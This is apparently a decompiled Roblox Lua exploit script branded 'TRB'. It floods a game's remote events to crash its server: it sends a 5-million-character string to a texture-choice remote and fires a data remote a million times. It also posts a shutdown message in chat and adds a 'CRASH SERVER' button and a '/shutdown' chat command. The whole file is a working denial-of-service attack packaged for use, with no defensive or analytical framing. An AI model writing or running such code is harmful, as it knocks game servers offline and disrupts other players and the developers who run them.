-- This file was generated at discord.gg/syncrypt

print(("|" .. (("\226\150\136\226\150\136\226\150\136\226\150\136\226\150\136\226\150\136\226\150\136\226\150\136\226\149\151\226\150\136\226\150\136\226\150\136\226\150\136\226\150\136\226\150\136\226\149\151 \226\150\136\226\150\136\226\150\136\226\150\136\226\150\136\226\150\136\226\149\151 \n\226\149\154\226\149\144\226\149\144\226\150\136\226\150\136\226\149\148\226\149\144\226\149\144\226\149\157\226\150\136\226\150\136\226\149\148\226\149\144\226\149\144\226\150\136\226\150\136\226\149\151\226\150\136\226\150\136\226\149\148\226\149\144\226\149\144\226\150\136\226\150\136\226\149\151\n   \226\150\136\226\150\136\226\149\145   \226\150\136\226\150\136\226\150\136\226\150\136\226\150\136\226\150\136\226\149\148\226\149\157\226\150\136\226\150\136\226\150\136\226\150\136\226\150\136\226\150\136\226\149\148\226\149\157\n   \226\150\136\226\150\136\226\149\145   \226\150\136\226\150\136\226\149\148\226\149\144\226\149\144\226\150\136\226\150\136\226\149\151\226\150\136\226\150\136\226\149\148\226\149\144\226\149\144\226\150\136\226\150\136\226\149\151\n   \226\150\136\226\150\136\226\149\145   \226\150\136\226\150\136\226\149\145  \226\150\136\226\150\136\226\149\145\226\150\136\226\150\136\226\150\136\226\150\136\226\150\136\226\150\136\226\149\148\226\149\157\n   \226\149\154\226\149\144\226\149\157   \226\149\154\226\149\144\226\149\157  \226\149\154\226\149\144\226\149\157\226\149\154\226\149\144\226\149\144\226\149\144\226\149\144\226\149\144\226\149\157"):gsub("\n", "\n|"))))
local v125 = game:GetService("ReplicatedStorage")
local up24 = v125
local v126 = game:GetService("Players")
local v129 = game:GetService("TextChatService")
local up25 = v129
v129 = v126.LocalPlayer
local v130 = v129:WaitForChild("PlayerGui")
local v128 = up24.DataEvents.UpdateTexturesChoice
local up26 = v128
v128 = up24.DataEvents.DataRemoteEvent
local up27 = v128
local v132 = string.rep("A", 5000000)
local v134 = function()
    local v91, v94
    local v88 = pcall(function()
        local v35 = up25:FindFirstChild("TextChannels")
        local v40 = v35
        if v35 then
            v40 = (up25.TextChannels:FindFirstChild("RBXGeneral"))
        end
        local v34 = v40
        if v34 then
            v34:SendAsync("Shuting down server creds to TRB")
        end
        return
    end)
    if (not v88) then
        v94 = up24:FindFirstChild("DefaultChatSystemChatEvents")
        v88 = v94
        if v94 then
            v88 = (up24.DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest"))
        end
        v91 = v88
        if v91 then
            v91:FireServer("Shuting down server creds to TRB", "All")
        end
    end
    return
end
local up28 = v132
local up29
local v135 = function()
    up29()
    local v100 = 3
    local v101 = 1
    for v99 = 1, v100, v101 do
        up26:FireServer(up28)
    end
    v100 = 1000000
    v101 = 1
    for v99 = 1, v100, v101 do
        up27:FireServer()
    end
    return
end
up29 = v134
local up30 = v135
local v141 = Instance.new("ScreenGui")
v141.Name = "CrashGui"
v141.ResetOnSpawn = false
v141.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
v141.Parent = v130
local v143 = Instance.new("Frame")
v143.Name = "Panel"
v143.Size = UDim2.new(0, 160, 0, 60)
v143.Position = UDim2.new(0, 20, 0.5, -30)
v143.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
v143.BorderSizePixel = 0
v143.Active = true
v143.Draggable = true
v143.Parent = v141
local v142 = Instance.new("UICorner")
v142.CornerRadius = UDim.new(0, 8)
v142.Parent = v143
local v145 = Instance.new("UIStroke")
v145.Color = Color3.fromRGB(200, 40, 40)
v145.Thickness = 1.5
v145.Parent = v143
local v144 = Instance.new("TextLabel")
v144.Size = UDim2.new(1, 0, 0, 20)
v144.Position = UDim2.new(0, 0, 0, 4)
v144.BackgroundTransparency = 1
v144.Text = "TRB"
v144.TextColor3 = Color3.fromRGB(200, 40, 40)
v144.Font = Enum.Font.GothamBold
v144.TextSize = 12
v144.Parent = v143
local v146 = Instance.new("TextButton")
v146.Name = "CrashBtn"
v146.Size = UDim2.new(1, -20, 0, 28)
v146.Position = UDim2.new(0, 10, 0, 26)
v146.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
v146.BorderSizePixel = 0
v146.Text = "CRASH SERVER"
v146.TextColor3 = Color3.fromRGB(255, 255, 255)
v146.Font = Enum.Font.GothamBold
v146.TextSize = 13
v146.AutoButtonColor = true
v146.Parent = v143
local v149 = Instance.new("UICorner")
v149.CornerRadius = UDim.new(0, 6)
v149.Parent = v146
v146.MouseButton1Click:Connect(up30)
v135 = v129.Chatted
local v152 = function(arg10_1)
    local v105 = arg10_1:lower()
    if (v105 == "/shutdown") then
        up30()
    end
    return
end
v135:Connect(v152)
print("type /shutdown in chat")

return
